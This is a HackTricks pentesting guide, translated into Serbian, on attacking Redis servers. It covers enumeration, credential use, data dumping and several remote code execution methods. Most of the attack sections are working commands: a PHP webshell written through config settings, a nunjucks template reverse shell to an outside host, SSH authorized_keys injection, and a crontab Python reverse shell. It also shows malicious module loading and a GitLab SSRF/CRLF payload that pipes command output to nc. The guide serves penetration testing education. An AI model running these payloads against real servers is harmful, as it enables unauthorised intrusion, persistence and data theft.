# 6379 - Pentesting Redis

{{#include ../banners/hacktricks-training.md}}

## Osnovne informacije

Iz [dokumentacije](https://redis.io/topics/introduction): Redis je open source (BSD licenca), u memoriji **skladište podataka**, korišćeno kao **baza podataka**, keš i posrednik poruka.

Po defaultu, Redis koristi protokol zasnovan na običnom tekstu, ali treba imati na umu da takođe može implementirati **ssl/tls**. Saznajte kako da [pokrenete Redis sa ssl/tls ovde](https://fossies.org/linux/redis/TLS.md).

**Podrazumevani port:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## Automatska Enumeracija

Neki automatski alati koji mogu pomoći u dobijanju informacija iz redis instance:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## Ručna Enumeracija

### Baner

Redis je **protokol zasnovan na tekstu**, možete jednostavno **poslati komandu u soket** i vraćene vrednosti će biti čitljive. Takođe zapamtite da Redis može raditi koristeći **ssl/tls** (ali to je veoma neobično).

U regularnoj Redis instanci možete se jednostavno povezati koristeći `nc` ili možete koristiti i `redis-cli`:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
Prva komanda koju možete probati je **`info`**. Ona **može vratiti izlaz sa informacijama** o Redis instanci **ili nešto** poput sledećeg:
```
-NOAUTH Authentication required.
```
U ovom poslednjem slučaju, to znači da **vam trebaju važeće akreditive** za pristup Redis instanci.

### Redis Autentifikacija

**Po defaultu** Redis se može pristupiti **bez akreditiva**. Međutim, može biti **konfiguran** da podrži **samo lozinku, ili korisničko ime + lozinku**.\
Moguće je **postaviti lozinku** u _**redis.conf**_ datoteci sa parametrima `requirepass` **ili privremeno** dok se usluga ne restartuje povezivanjem na nju i pokretanjem: `config set requirepass p@ss$12E45`.\
Takođe, **korisničko ime** može biti konfigurisano u parametru `masteruser` unutar _**redis.conf**_ datoteke.

> [!NOTE]
> Ako je samo lozinka konfigurisana, korisničko ime koje se koristi je "**default**".\
> Takođe, imajte na umu da **ne postoji način da se spolja** sazna da li je Redis konfiguran samo sa lozinkom ili korisničkim imenom+lozinkom.

U slučajevima poput ovog, **trebaće vam da pronađete važeće akreditive** da biste interagovali sa Redis-om, pa možete pokušati da [**brute-force**](../generic-hacking/brute-force.md#redis) to.\
**U slučaju da pronađete važeće akreditive, potrebno je da autentifikujete sesiju** nakon uspostavljanja veze sa komandom:
```bash
AUTH <username> <password>
```
**Validni kredencijali** će biti odgovoreni sa: `+OK`

### **Autentifikovana enumeracija**

Ako Redis server dozvoljava **anonimne konekcije** ili ako ste dobili validne kredencijale, možete započeti proces enumeracije za servis koristeći sledeće **komande**:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**Ostale Redis komande** [**mogu se naći ovde**](https://redis.io/topics/data-types-intro) **i** [**ovde**](https://lzone.de/cheat-sheet/Redis)**.**

Imajte na umu da se **Redis komande instance mogu preimenovati** ili ukloniti u _redis.conf_ datoteci. Na primer, ova linija će ukloniti komandu FLUSHDB:
```
rename-command FLUSHDB ""
```
Više o bezbednoj konfiguraciji Redis usluge ovde: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

Takođe možete **pratiti u realnom vremenu Redis komande** koje se izvršavaju sa komandom **`monitor`** ili dobiti top **25 najsporijih upita** sa **`slowlog get 25`**

Pronađite više zanimljivih informacija o više Redis komandi ovde: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **Dumpovanje Baze Podataka**

Unutar Redis-a **baze podataka su brojevi počevši od 0**. Možete saznati da li se neka koristi u izlazu komande `info` unutar "Keyspace" dela:

![](<../images/image (766).png>)

Ili možete jednostavno dobiti sve **keyspace-ove** (baze podataka) sa:
```
INFO keyspace
```
U tom primeru se koriste **baze podataka 0 i 1**. **Baza podataka 0 sadrži 4 ključa, a baza podataka 1 sadrži 1**. Po defaultu, Redis će koristiti bazu podataka 0. Da biste dumpovali, na primer, bazu podataka 1, potrebno je da uradite:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
U slučaju da dobijete sledeću grešku `-WRONGTYPE Operation against a key holding the wrong kind of value` dok izvršavate `GET <KEY>`, to je zato što ključ može biti nešto drugo osim stringa ili celog broja i zahteva poseban operator za prikazivanje.

Da biste saznali tip ključa, koristite komandu `TYPE`, primer ispod za list i hash ključeve.
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**Izvrni dump baze podataka sa npm**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **ili python** [**redis-utils**](https://pypi.org/project/redis-utils/)

## Redis RCE

### Interaktivna ljuska

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) može automatski dobiti interaktivnu ljusku ili obrnutu ljusku u Redis(<=5.0.5).
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

Info iz [**ovde**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). Morate znati **putanju** **foldera veb sajta**:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
Ako dođe do izuzetka pristupa webshell-u, možete isprazniti bazu podataka nakon pravljenja rezervne kopije i pokušati ponovo, zapamtite da vratite bazu podataka.

### Template Webshell

Kao u prethodnom odeljku, takođe možete prepisati neku html šablonsku datoteku koja će biti interpretirana od strane šablonskog engine-a i dobiti shell.

Na primer, prateći [**ovaj izveštaj**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/), možete videti da je napadač ubacio **rev shell u html** koji interpretira **nunjucks šablonski engine:**
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
> [!WARNING]
> Imajte na umu da **nekoliko engine-a za šablone kešira** šablone u **memoriji**, tako da čak i ako ih prepišete, novi **neće biti izvršen**. U tim slučajevima, ili je programer ostavio automatsko ponovno učitavanje aktivnim ili treba da uradite DoS napad na servis (i očekujete da će se automatski ponovo pokrenuti).

### SSH

Primer [odavde](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

Molimo vas da budete svesni da se rezultat **`config get dir`** može promeniti nakon drugih ručnih eksploatacionih komandi. Preporučuje se da ga pokrenete prvo odmah nakon prijavljivanja u Redis. U izlazu **`config get dir`** možete pronaći **home** **redis korisnika** (obično _/var/lib/redis_ ili _/home/redis/.ssh_), i znajući ovo znate gde možete napisati `authenticated_users` datoteku za pristup putem ssh **sa korisnikom redis**. Ako znate home drugog važećeg korisnika gde imate dozvole za pisanje, možete to takođe iskoristiti:

1. Generišite ssh javni-privatni ključ na vašem računaru: **`ssh-keygen -t rsa`**
2. Napišite javni ključ u datoteku : **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. Uvezite datoteku u redis : **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. Sačuvajte javni ključ u **authorized_keys** datoteku na redis serveru:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```

5. Na kraju, možete **ssh** na **redis server** sa privatnim ključem : **ssh -i id_rsa redis@10.85.0.52**

**Ova tehnika je automatizovana ovde:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
Poslednji primer je za Ubuntu, za **Centos**, gornja komanda bi trebala biti: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

Ova metoda se takođe može koristiti za zarađivanje bitcoina ：[yam](https://www.v2ex.com/t/286981#reply14)

### Učitaj Redis modul

1. Prateći uputstva sa [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) možete **kompilirati redis modul za izvršavanje proizvoljnih komandi**.
2. Zatim vam je potreban način da **otpremite kompajlirani** modul.
3. **Učitajte otpremni modul** u vreme izvršavanja sa `MODULE LOAD /path/to/mymodule.so`.
4. **Prikažite učitane module** da proverite da li je ispravno učitan: `MODULE LIST`.
5. **Izvršite** **komande**:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```

6. Otpustite modul kad god želite: `MODULE UNLOAD mymodule`.

### LUA sandbox zaobilaženje

[**Ovde**](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) možete videti da Redis koristi komandu **EVAL** za izvršavanje **Lua koda u sandboxu**. U povezanom postu možete videti **kako to zloupotrebiti** koristeći funkciju **dofile**, ali [očigledno](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) to više nije moguće. U svakom slučaju, ako možete **zaobići Lua** sandbox mogli biste **izvršiti proizvoljne** komande na sistemu. Takođe, iz istog posta možete videti neke **opcije za izazivanje DoS**.

Neki **CVE-ovi za izlazak iz LUA**:

- [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### Master-Slave Modul

​Master redis sve operacije automatski sinhronizuje sa slave redis, što znači da možemo smatrati ranjivost redis kao slave redis, povezan sa master redis koji kontrolišemo, zatim možemo uneti komandu u naš vlastiti redis.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF razgovor sa Redis-om

Ako možete poslati **nešifrovani** zahtev **ka Redis-u**, možete **komunicirati sa njim** jer će Redis čitati zahtev liniju po liniju i jednostavno odgovarati greškama na linije koje ne razume:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
Zato, ako pronađete **SSRF vuln** na veb sajtu i možete **kontrolisati** neke **hederе** (možda sa CRLF vuln) ili **POST parametre**, moći ćete da šaljete proizvoljne komande Redis-u.

### Primer: Gitlab SSRF + CRLF do Shell

U **Gitlab11.4.7** otkrivene su **SSRF** ranjivosti i **CRLF**. **SSRF** ranjivost je bila u **funkcionalnosti uvoza projekta sa URL-a** prilikom kreiranja novog projekta i omogućila je pristup proizvoljnim IP-ovima u formi \[0:0:0:0:0:ffff:127.0.0.1] (ovo će pristupiti 127.0.0.1), a **CRLF** vuln je iskorišćen jednostavno **dodavanjem %0D%0A** karaktera u **URL**.

Zato, bilo je moguće **zloupotrebiti ove ranjivosti da komunicirate sa Redis instancom** koja **upravlja redovima** iz **gitlab-a** i zloupotrebiti te redove da **dobijete izvršenje koda**. Payload za zloupotrebu Redis reda je:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
I **URL encode** zahtev **zloupotrebljavajući SSRF** i **CRLF** da izvrši `whoami` i pošalje izlaz putem `nc` je:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_Zbog nekog razloga (kao za autora_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _odakle je ova informacija preuzeta) eksploatacija je radila sa `git` šemom, a ne sa `http` šemom._

{{#include ../banners/hacktricks-training.md}}
